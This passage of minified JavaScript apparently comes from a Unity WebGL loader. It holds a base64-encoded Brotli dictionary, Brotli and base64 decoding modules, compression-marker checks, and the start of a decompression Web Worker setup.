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";
          },
          "dec/dictionary-browser.js": function(e, t, r) {
            var n = e("base64-js");
            r.init = function() {
              var t = e("./decode").BrotliDecompressBuffer,
                r = n.toByteArray(e("./dictionary.bin.js"));
              return t(r)
            }
          },
          "dec/huffman.js": function(e, t, r) {
            function n(e, t) {
              this.bits = e, this.value = t
            }

            function o(e, t) {
              for (var r = 1 << t - 1; e & r;) r >>= 1;
              return (e & r - 1) + r
            }

            function i(e, t, r, o, i) {
              do o -= r, e[t + o] = new n(i.bits, i.value); while (o > 0)
            }

            function a(e, t, r) {
              for (var n = 1 << t - r; t < s && (n -= e[t], !(n <= 0));) ++t, n <<= 1;
              return t - r
            }
            r.HuffmanCode = n;
            const s = 15;
            r.BrotliBuildHuffmanTable = function(e, t, r, d, l) {
              var u, c, f, h, p, m, w, b, y, g, v, A = t,
                U = new Int32Array(16),
                x = new Int32Array(16);
              for (v = new Int32Array(l), f = 0; f < l; f++) U[d[f]]++;
              for (x[1] = 0, c = 1; c < s; c++) x[c + 1] = x[c] + U[c];
              for (f = 0; f < l; f++) 0 !== d[f] && (v[x[d[f]]++] = f);
              if (b = r, y = 1 << b, g = y, 1 === x[s]) {
                for (h = 0; h < g; ++h) e[t + h] = new n(0, 65535 & v[0]);
                return g
              }
              for (h = 0, f = 0, c = 1, p = 2; c <= r; ++c, p <<= 1)
                for (; U[c] > 0; --U[c]) u = new n(255 & c, 65535 & v[f++]), i(e, t + h, p, y, u), h = o(h, c);
              for (w = g - 1, m = -1, c = r + 1, p = 2; c <= s; ++c, p <<= 1)
                for (; U[c] > 0; --U[c])(h & w) !== m && (t += y, b = a(U, c, r), y = 1 << b, g += y, m = h & w, e[A + m] = new n(b + r & 255, t - A - m & 65535)), u = new n(c - r & 255, 65535 & v[f++]), i(e, t + (h >> r), p, y, u), h = o(h, c);
              return g
            }
          },
          "dec/prefix.js": function(e, t, r) {
            function n(e, t) {
              this.offset = e, this.nbits = t
            }
            r.kBlockLengthPrefixCode = [new n(1, 2), new n(5, 2), new n(9, 2), new n(13, 2), new n(17, 3), new n(25, 3), new n(33, 3), new n(41, 3), new n(49, 4), new n(65, 4), new n(81, 4), new n(97, 4), new n(113, 5), new n(145, 5), new n(177, 5), new n(209, 5), new n(241, 6), new n(305, 6), new n(369, 7), new n(497, 8), new n(753, 9), new n(1265, 10), new n(2289, 11), new n(4337, 12), new n(8433, 13), new n(16625, 24)], r.kInsertLengthPrefixCode = [new n(0, 0), new n(1, 0), new n(2, 0), new n(3, 0), new n(4, 0), new n(5, 0), new n(6, 1), new n(8, 1), new n(10, 2), new n(14, 2), new n(18, 3), new n(26, 3), new n(34, 4), new n(50, 4), new n(66, 5), new n(98, 5), new n(130, 6), new n(194, 7), new n(322, 8), new n(578, 9), new n(1090, 10), new n(2114, 12), new n(6210, 14), new n(22594, 24)], r.kCopyLengthPrefixCode = [new n(2, 0), new n(3, 0), new n(4, 0), new n(5, 0), new n(6, 0), new n(7, 0), new n(8, 0), new n(9, 0), new n(10, 1), new n(12, 1), new n(14, 2), new n(18, 2), new n(22, 3), new n(30, 3), new n(38, 4), new n(54, 4), new n(70, 5), new n(102, 5), new n(134, 6), new n(198, 7), new n(326, 8), new n(582, 9), new n(1094, 10), new n(2118, 24)], r.kInsertRangeLut = [0, 0, 8, 8, 0, 16, 8, 16, 16], r.kCopyRangeLut = [0, 8, 0, 8, 16, 0, 16, 8, 16]
          },
          "dec/streams.js": function(e, t, r) {
            function n(e) {
              this.buffer = e, this.pos = 0
            }

            function o(e) {
              this.buffer = e, this.pos = 0
            }
            n.prototype.read = function(e, t, r) {
              this.pos + r > this.buffer.length && (r = this.buffer.length - this.pos);
              for (var n = 0; n < r; n++) e[t + n] = this.buffer[this.pos + n];
              return this.pos += r, r
            }, r.BrotliInput = n, o.prototype.write = function(e, t) {
              if (this.pos + t > this.buffer.length) throw new Error("Output buffer is not large enough");
              return this.buffer.set(e.subarray(0, t), this.pos), this.pos += t, t
            }, r.BrotliOutput = o
          },
          "dec/transform.js": function(e, t, r) {
            function n(e, t, r) {
              this.prefix = new Uint8Array(e.length), this.transform = t, this.suffix = new Uint8Array(r.length);
              for (var n = 0; n < e.length; n++) this.prefix[n] = e.charCodeAt(n);
              for (var n = 0; n < r.length; n++) this.suffix[n] = r.charCodeAt(n)
            }

            function o(e, t) {
              return e[t] < 192 ? (e[t] >= 97 && e[t] <= 122 && (e[t] ^= 32), 1) : e[t] < 224 ? (e[t + 1] ^= 32, 2) : (e[t + 2] ^= 5, 3)
            }
            var i = e("./dictionary");
            const a = 0,
              s = 1,
              d = 2,
              l = 3,
              u = 4,
              c = 5,
              f = 6,
              h = 7,
              p = 8,
              m = 9,
              w = 10,
              b = 11,
              y = 12,
              g = 13,
              v = 14,
              A = 15,
              U = 16,
              x = 17,
              E = 18,
              k = 20;
            var B = [new n("", a, ""), new n("", a, " "), new n(" ", a, " "), new n("", y, ""), new n("", w, " "), new n("", a, " the "), new n(" ", a, ""), new n("s ", a, " "), new n("", a, " of "), new n("", w, ""), new n("", a, " and "), new n("", g, ""), new n("", s, ""), new n(", ", a, " "), new n("", a, ", "), new n(" ", w, " "), new n("", a, " in "), new n("", a, " to "), new n("e ", a, " "), new n("", a, '"'), new n("", a, "."), new n("", a, '">'), new n("", a, "\n"), new n("", l, ""), new n("", a, "]"), new n("", a, " for "), new n("", v, ""), new n("", d, ""), new n("", a, " a "), new n("", a, " that "), new n(" ", w, ""), new n("", a, ". "), new n(".", a, ""), new n(" ", a, ", "), new n("", A, ""), new n("", a, " with "), new n("", a, "'"), new n("", a, " from "), new n("", a, " by "), new n("", U, ""), new n("", x, ""), new n(" the ", a, ""), new n("", u, ""), new n("", a, ". The "), new n("", b, ""), new n("", a, " on "), new n("", a, " as "), new n("", a, " is "), new n("", h, ""), new n("", s, "ing "), new n("", a, "\n\t"), new n("", a, ":"), new n(" ", a, ". "), new n("", a, "ed "), new n("", k, ""), new n("", E, ""), new n("", f, ""), new n("", a, "("), new n("", w, ", "), new n("", p, ""), new n("", a, " at "), new n("", a, "ly "), new n(" the ", a, " of "), new n("", c, ""), new n("", m, ""), new n(" ", w, ", "), new n("", w, '"'), new n(".", a, "("), new n("", b, " "), new n("", w, '">'), new n("", a, '="'), new n(" ", a, "."), new n(".com/", a, ""), new n(" the ", a, " of the "), new n("", w, "'"), new n("", a, ". This "), new n("", a, ","), new n(".", a, " "), new n("", w, "("), new n("", w, "."), new n("", a, " not "), new n(" ", a, '="'), new n("", a, "er "), new n(" ", b, " "), new n("", a, "al "), new n(" ", b, ""), new n("", a, "='"), new n("", b, '"'), new n("", w, ". "), new n(" ", a, "("), new n("", a, "ful "), new n(" ", w, ". "), new n("", a, "ive "), new n("", a, "less "), new n("", b, "'"), new n("", a, "est "), new n(" ", w, "."), new n("", b, '">'), new n(" ", a, "='"), new n("", w, ","), new n("", a, "ize "), new n("", b, "."), new n("\xc2\xa0", a, ""), new n(" ", a, ","), new n("", w, '="'), new n("", b, '="'), new n("", a, "ous "), new n("", b, ", "), new n("", w, "='"), new n(" ", w, ","), new n(" ", b, '="'), new n(" ", b, ", "), new n("", b, ","), new n("", b, "("), new n("", b, ". "), new n(" ", b, "."), new n("", b, "='"), new n(" ", b, ". "), new n(" ", w, '="'), new n(" ", b, "='"), new n(" ", w, "='")];
            r.kTransforms = B, r.kNumTransforms = B.length, r.transformDictionaryWord = function(e, t, r, n, a) {
              var s, d = B[a].prefix,
                l = B[a].suffix,
                u = B[a].transform,
                c = u < y ? 0 : u - 11,
                f = 0,
                h = t;
              c > n && (c = n);
              for (var p = 0; p < d.length;) e[t++] = d[p++];
              for (r += c, n -= c, u <= m && (n -= u), f = 0; f < n; f++) e[t++] = i.dictionary[r + f];
              if (s = t - n, u === w) o(e, s);
              else if (u === b)
                for (; n > 0;) {
                  var g = o(e, s);
                  s += g, n -= g
                }
              for (var v = 0; v < l.length;) e[t++] = l[v++];
              return t - h
            }
          },
          "node_modules/base64-js/index.js": function(e, t, r) {
            "use strict";

            function n(e) {
              var t = e.length;
              if (t % 4 > 0) throw new Error("Invalid string. Length must be a multiple of 4");
              return "=" === e[t - 2] ? 2 : "=" === e[t - 1] ? 1 : 0
            }

            function o(e) {
              return 3 * e.length / 4 - n(e)
            }

            function i(e) {
              var t, r, o, i, a, s, d = e.length;
              a = n(e), s = new c(3 * d / 4 - a), o = a > 0 ? d - 4 : d;
              var l = 0;
              for (t = 0, r = 0; t < o; t += 4, r += 3) i = u[e.charCodeAt(t)] << 18 | u[e.charCodeAt(t + 1)] << 12 | u[e.charCodeAt(t + 2)] << 6 | u[e.charCodeAt(t + 3)], s[l++] = i >> 16 & 255, s[l++] = i >> 8 & 255, s[l++] = 255 & i;
              return 2 === a ? (i = u[e.charCodeAt(t)] << 2 | u[e.charCodeAt(t + 1)] >> 4, s[l++] = 255 & i) : 1 === a && (i = u[e.charCodeAt(t)] << 10 | u[e.charCodeAt(t + 1)] << 4 | u[e.charCodeAt(t + 2)] >> 2, s[l++] = i >> 8 & 255, s[l++] = 255 & i), s
            }

            function a(e) {
              return l[e >> 18 & 63] + l[e >> 12 & 63] + l[e >> 6 & 63] + l[63 & e]
            }

            function s(e, t, r) {
              for (var n, o = [], i = t; i < r; i += 3) n = (e[i] << 16) + (e[i + 1] << 8) + e[i + 2], o.push(a(n));
              return o.join("")
            }

            function d(e) {
              for (var t, r = e.length, n = r % 3, o = "", i = [], a = 16383, d = 0, u = r - n; d < u; d += a) i.push(s(e, d, d + a > u ? u : d + a));
              return 1 === n ? (t = e[r - 1], o += l[t >> 2], o += l[t << 4 & 63], o += "==") : 2 === n && (t = (e[r - 2] << 8) + e[r - 1], o += l[t >> 10], o += l[t >> 4 & 63], o += l[t << 2 & 63], o += "="), i.push(o), i.join("")
            }
            r.byteLength = o, r.toByteArray = i, r.fromByteArray = d;
            for (var l = [], u = [], c = "undefined" != typeof Uint8Array ? Uint8Array : Array, f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/", h = 0, p = f.length; h < p; ++h) l[h] = f[h], u[f.charCodeAt(h)] = h;
            u["-".charCodeAt(0)] = 62, u["_".charCodeAt(0)] = 63
          }
        };
        for (var r in t) t[r].folder = r.substring(0, r.lastIndexOf("/") + 1);
        var n = function(e) {
            var r = [];
            return e = e.split("/").every(function(e) {
              return ".." == e ? r.pop() : "." == e || "" == e || r.push(e)
            }) ? r.join("/") : null, e ? t[e] || t[e + ".js"] || t[e + "/index.js"] : null
          },
          o = function(e, t) {
            return e ? n(e.folder + "node_modules/" + t) || o(e.parent, t) : null
          },
          i = function(e, t) {
            var r = t.match(/^\//) ? null : e ? t.match(/^\.\.?\//) ? n(e.folder + t) : o(e, t) : n(t);
            if (!r) throw "module not found: " + t;
            return r.exports || (r.parent = e, r(i.bind(null, r), r, r.exports = {})), r.exports
          };
        return i(null, e)
      },
      decompress: function(e) {
        this.exports || (this.exports = this.require("decompress.js"));
        try {
          return this.exports(e)
        } catch (e) {}
      },
      hasUnityMarker: function(e) {
        var t = "UnityWeb Compressed Content (brotli)";
        if (!e.length) return !1;
        var r = 1 & e[0] ? 14 & e[0] ? 4 : 7 : 1,
          n = e[0] & (1 << r) - 1,
          o = 1 + (Math.log(t.length - 1) / Math.log(2) >> 3);
        if (commentOffset = r + 1 + 2 + 1 + 2 + (o << 3) + 7 >> 3, 17 == n || commentOffset > e.length) return !1;
        for (var i = n + (6 + (o << 4) + (t.length - 1 << 6) << r), a = 0; a < commentOffset; a++, i >>>= 8)
          if (e[a] != (255 & i)) return !1;
        return String.fromCharCode.apply(null, e.subarray(commentOffset, commentOffset + t.length)) == t
      }
    },
    decompress: function(e, t) {
      var r = this.gzip.hasUnityMarker(e) ? this.gzip : this.brotli.hasUnityMarker(e) ? this.brotli : this.identity;
      if (this.serverSetupWarningEnabled && r != this.identity && (console.log("You can reduce your startup time if you configure your web server to host .unityweb files using " + (r == this.gzip ? "gzip" : "brotli") + " compression."), this.serverSetupWarningEnabled = !1), "function" != typeof t) return r.decompress(e);
      if (!r.worker) {
        var n = URL.createObjectURL(new Blob(["this.require = ", r.require.toString(), "; this.decompress = ", r.decompress.toString(), "; this.onmessage = ", function(e) {
          var t = {
            id: e.data.id,
            decompressed: this.decompress(e.data.compressed)
          };
          postMessage(t, t.decompressed ? [t.decompressed.buffer] : [])
        }.toString(), "; postMessage({ ready: true });"], {
          type: "text/javascript"
        }));
        r.worker = new Worker(n), r.worker.onmessage = function(e) {
